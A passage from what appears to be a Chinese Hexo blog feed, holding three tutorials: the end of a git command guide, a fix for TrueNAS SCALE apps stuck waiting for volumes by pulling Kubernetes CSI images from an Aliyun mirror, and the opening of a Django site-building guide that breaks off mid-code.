class="language-bash">切换分支</span></span><br><span class="line">git switch &lt;bname&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建并切换分支</span></span><br><span class="line">git switch -c &lt;bname&gt;</span><br></pre></td></tr></table></figure><h2 id="合并分支：merge和rebase">合并分支：merge和rebase</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将bname分支的内容合并到当前分支</span></span><br><span class="line">git merge &lt;bname&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将当前分支以onto为起点，形成新的提交树</span></span><br><span class="line">git rebase &lt;onto&gt;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将bname分支以onto为起点，形成新的提交树</span></span><br><span class="line">git rebase &lt;onto&gt; &lt;bname&gt;</span><br></pre></td></tr></table></figure><p>下面简要说明下两者间的区别。假设我们当前的开发情况如下，在<code>c1</code>结点创建了一个<code>dev</code>分支进行开发。在开发过程中，在<code>main</code>分支有人提交了代码。此时的提交记录如下图所示：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202112151534480.png!def" alt="image-20211215153431421"></p><p>那么，当我们开发完成后想将代码提交到<code>main</code>分支时，可以有如下两种方式：</p><ul><li><p>merge:</p><ol><li>切换到<code>main</code>分支：<code>git checkout main</code></li><li>执行合并：<code>git merge dev</code></li></ol><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202112160826969.png!def" alt="image-20211216082652882"></p><p>此时<code>main</code>分支就包含了<code>dev</code>分支上的所有内容。</p></li><li><p>rebase:</p><p>在<code>dev</code>分支上可以直接使用<code>git rebase main</code>，将代码提交到<code>main</code>分支上。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202112160832780.png!def" alt="image-20211216083242723"></p><p>可以看到，<code>dev</code>本来是以c1提交为基础开发的，而进行<code>rebase</code>后，git会把<code>dev</code>分支的代码，以<code>main</code>分支的最新代码作为起始点，重新生成新的提交。从结果上看，使用<code>rebase</code>比<code>merge</code>有更加简单清晰的提交记录。</p></li></ul><h2 id="撤销变更：reset和revert">撤销变更：reset和revert</h2><p>在讲撤销变更之前，首先说明一下<code>HEAD</code>和相对引用。</p><p><code>HEAD</code>一般情况下指向当前分支的最新提交（使用<code>git checkout &lt;hash&gt;</code>可以将HEAD指向特定提交）。</p><p><code>^</code>和<code>~</code>符号是相对引用，其中<code>^</code>表示上一级提交，有n个<code>^</code>则表示上n个提交；<code>~</code>后面更上数字，<code>~n</code>表示上n个提交。</p><ul><li><p><code>git reset</code>撤销本地的提交，默认仅回退提交记录，不会删除本地的修改；加上<code>--hard</code>参数会将本地修改全部删除，要谨慎使用。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回退到上个版本</span></span><br><span class="line">git reset HEAD^ </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回退到上上上个版本</span></span><br><span class="line">git reset HEAD~3</span><br></pre></td></tr></table></figure></li><li><p><code>git revert</code> 是用一个新的提交来声明之前的提交要被撤销。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回退到上个版本，注意与reset不同，没有^</span></span><br><span class="line">git revert HEAD</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回退到上上版本</span></span><br><span class="line">git revert HEAD^</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202112160933990.png!defl" alt="image-20211216093303924"></p><h2 id="修改提交树：cherry-pick和rebase-i">修改提交树：cherry-pick和rebase -i</h2><ul><li><p>cherry-pick是将一个或几个记录应用到当前分支</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将指定记录转移到当前分支</span></span><br><span class="line">git cherry-pick &lt;hash1&gt; &lt;hash2&gt; ...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定分支的最新提交转移到当前分支</span></span><br><span class="line">git cherry-pick &lt;bname&gt;</span><br></pre></td></tr></table></figure><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202112161054727.png!def" alt="image-20211216105402633"></p></li><li><p>rebase加上<code>-i</code>参数会打开交互式的提交界面，通过它可以调整提交记录、删除不要的提交、和并提交等。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改最近的两次提交</span></span><br><span class="line">git rebase -i HEAD~2</span><br></pre></td></tr></table></figure><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202112161102552.png!def" alt="image-20211216110255505"></p><p>一般是使用的vim编辑器，通过调整各个记录的顺序可以修改提交顺序，按照下方给出的提示，可以删除、编辑之前的提交记录。</p></li></ul><h1>常用操作</h1><h2 id="暂存修改：stash">暂存修改：stash</h2><p>如果已经有了修改，又需要切换到其他分支，可以使用<code>stash</code>暂存已经做出的修改，之后再进行恢复。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">暂存修改</span></span><br><span class="line">git stash </span><br><span class="line">git stash save &lt;comment&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看</span></span><br><span class="line">git stash list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看修改的文件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">index可选，不加则默认第一个</span></span><br><span class="line">git stash show [index] # index形式为stash@&#123;num&#125;，即list输出的index</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件的修改内容</span></span><br><span class="line">git stash show -p [index]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">应用某个存储，但不会从list中删除</span></span><br><span class="line">git stash apply [index]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">应用并从list中删除某个存储</span></span><br><span class="line">git stash pop [index]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">丢弃某个存储</span></span><br><span class="line">git stash drop [index]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除所有的暂存</span></span><br><span class="line">git stash clear</span><br></pre></td></tr></table></figure><h2 id="标签：tag">标签：tag</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给指定commit打标签，不指定则默认为当前commit</span></span><br><span class="line">git tag &lt;tag&gt; [hash]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成带注释的标签</span></span><br><span class="line">git tag -a &lt;tag&gt; [hash] -m &lt;msg&gt;</span><br></pre></td></tr></table></figure><p>想要查询距离某个提交最近的tag，可以使用<code>describe</code>命令。<strong>默认情况下仅会查询带有注释的标签</strong>，如果想有查询所有标签则可以加上<code>--tags</code>参数。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找距离指定提交最近的标签</span></span><br><span class="line">git describe &lt;commithash&gt; [--tags]</span><br></pre></td></tr></table></figure><p>如果指定的commit处正好有标签，则直接输出标签名，否则输出如下格式的字符串：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># tag-最近的标签名；num-距离该标签的提交数；hash-本次查询的commit的hash</span><br><span class="line">&lt;tag&gt;-&lt;num&gt;-&lt;hash&gt;</span><br></pre></td></tr></table></figure><h1>远程操作</h1><p>当使用<code>clone</code>命令从远端克隆一个仓库后，本地会有远程分支<code>origin/master</code>（具体名字由远程主机和分支名决定），它反映了远程仓库的状态。</p><h2 id="拉取：pull">拉取：pull</h2><p>在讲<code>pull</code>之前，有必要先说明一下<code>fetch</code>命令，它会从远程仓库下载本地确实的记录，更新本地的远程分支（如<code>origin/master</code>），它不会更改本地的分支和文件。</p><p>默认情况下，<code>git pull</code>命令是<code>fetch</code>+<code>merge</code>的组合，也就可以将本地与远程的文件同步。如果添加<code>--rebase</code>参数，则使用<code>rebase</code>来代替默认的<code>merge</code>操作。</p><h2 id="推送：push">推送：push</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">基本格式为   remotename <span class="built_in">source</span>:dest</span></span><br><span class="line">git push [-u] &lt;remote&gt; &lt;local_branch&gt;:&lt;remote_branch&gt;</span><br></pre></td></tr></table></figure><p><code>-u</code>为<code>--set-upstream</code>的缩写，当推送新的分支到远程仓库时，需要该参数建立与远程仓库的关联。</p><p><code>remote_branch</code>不填，则默认与<code>local_branch</code>相同。</p><p><code>local_branch</code>为空时，可以删除远程分支，如<code>git push origin :dev</code>则会删除远程仓库的<code>dev</code>分支，但本地的<code>dev</code>分支不会删除。</p><p>同理，使用<code>git fetch origin :dev</code>会在本地新建<code>dev</code>分支。</p><div class="note info flat"><p>不建议使用以上两种删除和新建分支的方式，因为这会导致本地与远程的分支联系错乱，需要自己重新指定。</p></div><h1>其他操作</h1><h2 id="合并多个提交为一个提交">合并多个提交为一个提交</h2><p>当在开发过程中，针对同一问题进行了多次提交，如果不想保留历史提交记录而想将之前的多次提交合并为一次提交，则可以使用<code>rebase -i</code>方便地修改之前的提交记录。</p><p>假设之前进行了3次提交，如下所示：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202112312220512.png!def" alt="image-20211231222005298"></p><p>使用<code>git rebase -i HEAD~2</code>合并第2、3两次提交（<code>rebase</code>是将<strong>指定提交后面</strong>的提交进行修改，因此无法合并第1次的提交）。会进入如下界面：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202112312226462.png!def" alt="image-20211231222607355"></p><p>想将3号提交合并到2上，则将3号提交前面的<code>pick</code>修改为<code>squash</code>，最终结果为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pick 7973919 2</span><br><span class="line">squash 1b89bd1 3</span><br></pre></td></tr></table></figure><p>将修改的文件保存后进入下一步的编辑提交信息的操作。</p><div class="note info flat"><p>由于我安装<code>git</code>时指定了编辑器是vscode，所以这些编辑操作会在vscode中进行，此时修改完成后关闭标签页即可进入到下一步。如果是默认的<code>vim</code>编辑器，则需要使用<code>wq</code>进行保存后进入下一步。</p></div><p>编辑提交信息界面如下所示：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202112312233860.png!def" alt="image-20211231223337713"></p><p>可以使用<code>#</code>将之前的提交信息注释掉，然后添加本次的提交信息，保存即可完成此次合并提交。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202112312235160.png!def" alt="image-20211231223521044"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TrueNAS SCALE创建app提示waiting for a volume to be created...</title>
      <link href="/posts/1264147657.html"/>
      <url>/posts/1264147657.html</url>
      
        <content type="html"><![CDATA[<p>先说结论，问题原因是系统默认拉取的是<code>k8s.gcr.io</code>的镜像，而该网址国内无法访问，所以最简单的方式是科学上网，没有条件的可以继续看下去。</p><h1>错误介绍</h1><p>官方默认禁用了docker的<code>iptables</code>和<code>bridge</code>，虽然可以通过指定配置文件的方式来避免这些限制，但是升级系统的时候还是会恢复到原先的配置，每次都要重新指定，也比较麻烦。故萌生了使用官方提供的k8s的方式来创建应用。</p><p>官方提供的app非常少，好在有第三方提供的模板可供使用，地址：<a href="https://truecharts.org/manual/Quick-Start%20Guides/02-Adding-TrueCharts/" title="" target="">02 - Adding TrueCharts to SCALE - TrueCharts</a></p><p>但是在尝试创建应用时，却一直卡在<code>DEPLOYING</code>状态，点击后点开<code>Application Events</code>，提示<code>waiting for a volume to be created, either by external provisioner &quot;zfs.csi.openebs.io&quot; or manually created by system administrator</code>。由于没接触过k8s，只能网上搜索该错误提示。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202110162321949.png!def" alt="image-20211016232057855"></p><p>有人说是因为权限问题，选择给<code>ix-applications</code>目录赋予777权限，完全没有解决。</p><h1>定位问题</h1><p>仔细查看出错提示，猜测问题可能出在<code>zfs.csi.openebs.io</code>。查询openebs的官方文档：<a href="https://openebs.io/docs#local-volumes">OpenEBS Documentation | OpenEBS Docs</a>，进入<a href="https://github.com/openebs/zfs-localpv">ZFS Local PV</a>分页，在README中发现使用<code>kubectl get pods -n kube-system -l role=openebs-zfs</code>可以查看ZFS驱动的运行状态（注意在TrueNAS中需要使用<code>k3s</code>运行该命令，即<code>k3s kubectl get ...</code>）。输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NAME                       READY   STATUS             RESTARTS   AGE</span><br><span class="line">openebs-zfs-node-wqn2v     1/2     ImagePullBackOff   0          7h43m</span><br><span class="line">openebs-zfs-controller-0   1/5     ImagePullBackOff   0          7h43m</span><br></pre></td></tr></table></figure><p>很明显驱动没有正常运行，查询<code>ImagePullBackOff</code>错误提示，得知是镜像拉取失败。运行<code>k3s kubectl describe pod openebs-zfs-controller-0 -n kube-system</code>查看pod的状态，主要看Events部分的输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Events:</span><br><span class="line">  Type     Reason   Age                       From     Message</span><br><span class="line"> Warning  Failed   48m (x12 over 7h23m)      kubelet  Failed to pull image &quot;k8s.gcr.io/sig-storage/snapshot-controller:v4.0.0&quot;: rpc error: code = Unknown desc = Error response from daemon: Get &quot;https://k8s.gcr.io/v2/&quot;: context deadline exceeded</span><br><span class="line"> Warning  Failed   43m (x151 over 7h29m)     kubelet  (combined from similar events): Failed to pull image &quot;k8s.gcr.io/sig-storage/csi-snapshotter:v4.0.0&quot;: rpc error: code = Unknown desc = Error response from daemon: Get &quot;https://k8s.gcr.io/v2/&quot;: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)</span><br><span class="line"> Normal   Pulling  38m (x72 over 7h39m)      kubelet  Pulling image &quot;k8s.gcr.io/sig-storage/csi-resizer:v1.1.0&quot;</span><br><span class="line"> Normal   BackOff  3m33s (x1396 over 7h33m)  kubelet  Back-off pulling image &quot;k8s.gcr.io/sig-storage/csi-resizer:v1.1.0&quot;</span><br></pre></td></tr></table></figure><p>可以看出，系统想要从<code>k8s.gcr.io</code>拉取镜像，而该站无法访问，所以拉取失败。</p><h1>解决方法</h1><p>搜索该问题，发现可以通过国内镜像仓库手动拉取后，修改tag来标记为gcr.io的镜像。国内可以使用阿里云的镜像站：<strong><a href="http://registry.aliyuncs.com/google_containers">registry.aliyuncs.com/google_containers</a></strong></p><p>当前系统版本为<code>TrueNAS-SCALE-21.08-BETA.2</code>，下面所列出的镜像版本可能随着系统的变更会有变化，还是以实际情况为准。</p><ol><li><p>首先通过前述的<code>describe pod</code>命令查看有哪些镜像需要拉取，主要有：<code>csi-resizer:v1.1.0</code>，<code>csi-snapshotter:v4.0.0</code>，<code>snapshot-controller:v4.0.0</code>，<code>csi-provisioner:v2.1.0</code>，<code>csi-node-driver-registrar:v2.1.0</code>。</p></li><li><p>手动拉取并标记</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull registry.aliyuncs.com/google_containers/csi-resizer:v1.1.0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意空格</span></span><br><span class="line">docker tag registry.aliyuncs.com/google_containers/csi-resizer:v1.1.0 k8s.gcr.io/sig-storage/csi-resizer:v1.1.0</span><br></pre></td></tr></table></figure></li><li><p>删除国内镜像的标记（可选）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker rmi registry.aliyuncs.com/google_containers/csi-resizer:v1.1.0</span><br></pre></td></tr></table></figure></li><li><p>重复2、3两步，将所有需要的镜像都手动拉取下来</p></li><li><p>查看驱动安装状态，应该显示<code>Running</code>状态，此时就可以正常安装app了</p></li></ol><p>为了方便，给出所有的拉取、标记、删除镜像的命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull registry.aliyuncs.com/google_containers/csi-resizer:v1.1.0</span><br><span class="line">docker tag registry.aliyuncs.com/google_containers/csi-resizer:v1.1.0 k8s.gcr.io/sig-storage/csi-resizer:v1.1.0</span><br><span class="line">docker rmi registry.aliyuncs.com/google_containers/csi-resizer:v1.1.0</span><br><span class="line">docker pull registry.aliyuncs.com/google_containers/csi-snapshotter:v4.0.0</span><br><span class="line">docker tag registry.aliyuncs.com/google_containers/csi-snapshotter:v4.0.0 k8s.gcr.io/sig-storage/csi-snapshotter:v4.0.0</span><br><span class="line">docker rmi registry.aliyuncs.com/google_containers/csi-snapshotter:v4.0.0</span><br><span class="line">docker pull registry.aliyuncs.com/google_containers/snapshot-controller:v4.0.0</span><br><span class="line">docker tag registry.aliyuncs.com/google_containers/snapshot-controller:v4.0.0 k8s.gcr.io/sig-storage/snapshot-controller:v4.0.0</span><br><span class="line">docker rmi registry.aliyuncs.com/google_containers/snapshot-controller:v4.0.0</span><br><span class="line">docker pull registry.aliyuncs.com/google_containers/csi-provisioner:v2.1.0</span><br><span class="line">docker tag registry.aliyuncs.com/google_containers/csi-provisioner:v2.1.0 k8s.gcr.io/sig-storage/csi-provisioner:v2.1.0</span><br><span class="line">docker rmi registry.aliyuncs.com/google_containers/csi-provisioner:v2.1.0</span><br><span class="line">docker pull registry.aliyuncs.com/google_containers/csi-node-driver-registrar:v2.1.0</span><br><span class="line">docker tag registry.aliyuncs.com/google_containers/csi-node-driver-registrar:v2.1.0 k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.1.0</span><br><span class="line">docker rmi registry.aliyuncs.com/google_containers/csi-node-driver-registrar:v2.1.0</span><br></pre></td></tr></table></figure><h1>参考</h1><ol><li><a href="https://www.cnblogs.com/kevingrace/p/12778066.html">无法直接在国内网络环境下从k8s.gcr.io下载镜像问题 - 散尽浮华 - 博客园 (cnblogs.com)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> nas </category>
          
      </categories>
      
      
        <tags>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简述Django建站步骤</title>
      <link href="/posts/1700955345.html"/>
      <url>/posts/1700955345.html</url>
      
        <content type="html"><![CDATA[<p>官方文档地址：<a href="https://docs.djangoproject.com/zh-hans/3.2/">Django 文档 | Django 文档 | Django (djangoproject.com)</a></p><h1>创建项目</h1><ol><li><p>使用如下命令创建一个Django项目：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">django-admin startproject mysite</span><br></pre></td></tr></table></figure><p>此命令会在当前目录下创建一个 <code>mysite</code> 目录，其内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysite/</span><br><span class="line">    manage.py</span><br><span class="line">    mysite/</span><br><span class="line">        __init__.py</span><br><span class="line">        settings.py</span><br><span class="line">        urls.py</span><br><span class="line">        asgi.py</span><br><span class="line">        wsgi.py</span><br></pre></td></tr></table></figure><p>其中，需要重点关注的是<code>urls.py</code>和<code>settings.py</code>文件，他们分别用于管理站点的路由和配置。</p></li><li><p>使用如下名命令创建一个应用：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python manage.py startapp app_name</span><br></pre></td></tr></table></figure><p>此命令会创建一个<code>app_name</code>目录，内容大致如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app_name/</span><br><span class="line">    __init__.py</span><br><span class="line">    admin.py</span><br><span class="line">    apps.py</span><br><span class="line">    migrations/</span><br><span class="line">        __init__.py</span><br><span class="line">    models.py</span><br><span class="line">    tests.py</span><br><span class="line">    views.py</span><br></pre></td></tr></table></figure><p><code>models.py</code>和<code>views.py</code>分别存放应用的模型层和视图层代码。此外，还可以新建一个<code>urls.py</code>文件，将应用的所有路由配置存放在这，方便管理。</p></li><li><p>使用如下命令可以启动内置的简易web服务器，用于调试：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure></li></ol><h1>路由管理</h1><p>一般情况下，Django会根据配置文件中的<code>ROOT_URLCONF</code>项（默认为项目根目录的<code>urls.py</code>文件）寻找名为 <code>urlpatterns</code> 变量并且按序匹配正则表达式。路由列表项一般由<code>path</code>或<code>re_path</code>函数生成。</p><p>关于路由是如何匹配的，在此不再赘述，官方文档讲解非常详细：<a href="https://docs.djangoproject.com/zh-hans/3.2/topics/http/urls/">URL调度器 | Django 文档 | Django (djangoproject.com)</a></p><h2 id="反向解析">反向解析</h2><p>当项目的url地址发生变化，我们需要同步修改代码中使用到的url，这显然非常容易出错和遗漏。使用反向解析技术，在使用url时，不直接硬编码，而是使用url映射的地址，这样，即使url发生了变化，在代码中也可自动的映射到正确的地址。</p><p>在使用<code>path</code>（或<code>re_path</code>）指定urlpatterns时，在函数中指定<code>name</code>变量的值，如：<code>path('articles/&lt;int:year&gt;/', views.year_archive, name='news-year-archive'),</code>，可以直接利用<code>news-year-archive</code>这个名字映射到正确的url地址。</p><p>在模板和视图中，可以采用如下方式进行反向解析：</p><ul><li><p>模板，使用 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/templates/builtins/#std:templatetag-url"><code>url</code></a> 模板标签</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;# 参数是可选的 #&#125;</span><br><span class="line">&#123;% url &#x27;别名&#x27; [&#x27;参数1&#x27; &#x27;参数2...&#x27;] %&#125;</span><br><span class="line">&#123;# 如 #&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;% url &#x27;news-year-archive&#x27; 2012 %&#125;&quot;</span>&gt;</span>2012 Archive<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;% url &#x27;news-year-archive&#x27; yearvar %&#125;&quot;</span>&gt;</span>&#123;&#123; yearvar &#125;&#125; Archive<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>视图，使用 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/urlresolvers/#django.urls.reverse" title="django.urls.reverse"><code>reverse()</code></a> 函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponseRedirect</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> reverse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirect_to_year</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    year = <span class="number">2006</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponseRedirect(reverse(<span class="string">&#x27;news-year-archive&#x27;</span>, args=(year,)))</span><br></pre></td></tr></table></figure></li></ul><h1>模板</h1><p>默认情况下，在配置文件的<code>TEMPLATES</code>项中，<code>APP_DIRS</code>为True，即Django会搜索每个应用子目录下的<code>templates</code>文件夹搜索模板源文件。为了方便，可以配置<code>'DIRS': [BASE_DIR / 'templates'],</code>并在项目根目录下新建一个<code>templates</code>目录，且为每个应用再创建对应的子目录，将应用的模板源文件放在对应的子目录内。Django按照一定的规则搜索指定的模板文件，使用这种方式可以避免同名模板文件匹配错误的问题。</p><p>可能的目录结构如下图所示：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202110022311292.png!def" alt=""></p><p>Django 内置了自己的模板系统后端，即 Django 模板语言（DTL），也支持Jinja2及其他后端。下面以DTL为例，介绍模板的使用方式。</p><p><a href="https://docs.djangoproject.com/zh-hans/3.2/topics/templates/">模板 | Django 文档 | Django (djangoproject.com)</a></p><h2 id="语法">语法</h2><h3 id="变量，-swig￼42">变量，<code>&#123;&#123; &#125;&#125;</code></h3><p>变量从上下文中输出一个值，上下文是一个类似于字典的对象，将键映射到值。如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">My first name is &#123;&#123; first_name &#125;&#125;. My last name is &#123;&#123; last_name &#125;&#125;.</span><br></pre></td></tr></table></figure><p>对于字典查找，属性查找和列表索引查找均以<strong>点符号</strong>实现：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; my_dict.key &#125;&#125;</span><br><span class="line">&#123;&#123; my_object.attribute &#125;&#125;</span><br><span class="line">&#123;&#123; my_list.0 &#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="标签，-swig￼43">标签，<code>&#123;% %&#125;</code></h3><p><a href="https://docs.djangoproject.com/zh-hans/3.2/ref/templates/builtins/#ref-templates-builtins-tags">内置模板标签和过滤器 | Django 文档 | Django (djangoproject.com)</a></p><p>用于将一些服务器端的功能嵌入到模板中，如流程控制等。大部分标签需要与结束标签成对使用，内置标签见上文的链接。</p><ul><li><p><code>if</code>表达式</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% if 条件表达式1 %&#125;</span><br><span class="line">    ...</span><br><span class="line">&#123;% elif 条件表达式2 %&#125;</span><br><span class="line">    ...</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">    ...</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><ul><li>可以使用 <code>and</code>、<code>or</code> 或 <code>not</code> 来测试一些变量或取反某个变量</li><li>可以使用运算符 <code>==</code>、<code>!=</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&lt;=</code>、<code>&gt;=</code>、<code>in</code>、<code>not in</code>、<code>is</code> 和<code>is not</code></li></ul></li><li><p><code>for</code>表达式</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% for 变量 in 可迭代对象 [reversed] %&#125;</span><br><span class="line">    ...                   |--反向循环一个列表</span><br><span class="line">&#123;% empty %&#125;</span><br><span class="line">    ... 可迭代对象无数据时填充的语句</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><ul><li><p>内置变量<code>forloop</code></p><table><thead><tr><th>变量名</th><th>描述</th></tr></thead><tbody><tr><td>forloop.counter</td><td>循环计数器，表示当前循环的索引（从 1 开始）。</td></tr><tr><td>forloop.counter0</td><td>循环计数器，表示当前循环的索引（从 0 开始）。</td></tr><tr><td>forloop.revcounter</td><td>反向循环计数器（以最后一次循环为 1，反向计数）。</td></tr><tr><td>forloop.revcounter0</td><td>反向循环计数器（以最后一次循环为 0，反向计数）。</td></tr><tr><td>forloop.first</td><td>当前循环为首个循环时，该变量为 True</td></tr><tr><td>forloop.last</td><td>当前循环为最后一个循环时，该变量为 True</td></tr><tr><td>forloop.parentloop</td><td>在嵌套循环中，指向当前循环的上级循环</td></tr></tbody></table></li></ul></li></ul><h3 id="过滤器，">过滤器，<code>|</code></h3><p>过滤器转换变量和标签参数的值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; 变量|过滤器1:&#x27;参数1&#x27;|过滤器2:&#x27;参数2&#x27; &#125;&#125;</span><br></pre></td></tr></table></figure><p>常用过滤器</p><table><thead><tr><th>过滤器</th><th>说明</th></tr></thead><tbody><tr><td>lower</td><td>将一个字符串转换为全小写</td></tr><tr><td>upper</td><td>将一个字符串转换为全大写</td></tr><tr><td>safe</td><td>标记一个字符串在输出前不需要进一步的 HTML 转义</td></tr><tr><td>add:“n”</td><td>将参数添加到值中</td></tr><tr><td>truncatechars:“n”</td><td>如果一个字符串的长度超过指定的字符数，则截断它。截断后的字符串将以一个可翻译的省略号（“…”）结束。</td></tr></tbody></table><h2 id="模板继承">模板继承</h2><p>模板继承允许你建立一个基本的“骨架”模板，它包含了你网站的所有常用元素，并定义了子模板可以覆盖的<strong>块</strong>。对于多个网页有相同内容的网站十分有用。</p><ol><li><p>建立<code>base.html</code>模板文件（名字随意），在其中用<code>&#123;% block block_name %&#125;&#123;% endblock %&#125;</code>定义可以被子模板覆盖的块。</p></li><li><p>建立子模板<code>test.html</code>，其内容如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends &quot;base.html&quot; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block block_name %&#125;My content&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p><strong>第一行</strong>使用<code>extends</code>标签继承基模板，后面根据需要，使用<code>block</code>标签覆盖对应的块。对于没有指明需要覆盖的块，则会继承基模板中的内容。</p></li></ol><h1>请求和响应对象</h1><p><a href="https://docs.djangoproject.com/zh-hans/3.2/ref/request-response/">请求和响应对象 | Django 文档 | Django (djangoproject.com)</a></p><h2 id="请求对象-HttpRequest">请求对象 HttpRequest</h2><h3 id="请求字符串">请求字符串</h3><p><code>HttpRequest.GET</code>（以下简称request.GET）是一个<code>QueryDict</code>类型，继承自<code>MultiValueDict</code>，是一个多值的字典，即一个键对应的值可以是一个列表。在http请求中，GET方法在请求时可以对一个参数携带多个数值，如<code>?abc=321&amp;abc=123</code>，此时在Django中输出<code>request.GET</code>，其结果为<code>&lt;QueryDict: &#123;'abc': ['321', '123']&#125;&gt;</code>。</p><p>只要url中含有请求字符串（?xx=xxx的形式），无论是POST还是GET方法，都可以通过<code>request.GET</code>来获取请求字符串中的数据。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请求链接为：GET 127.0.0.1:8000?test=123&amp;abc=123&amp;abc=321</span></span><br><span class="line"></span><br><span class="line"><span 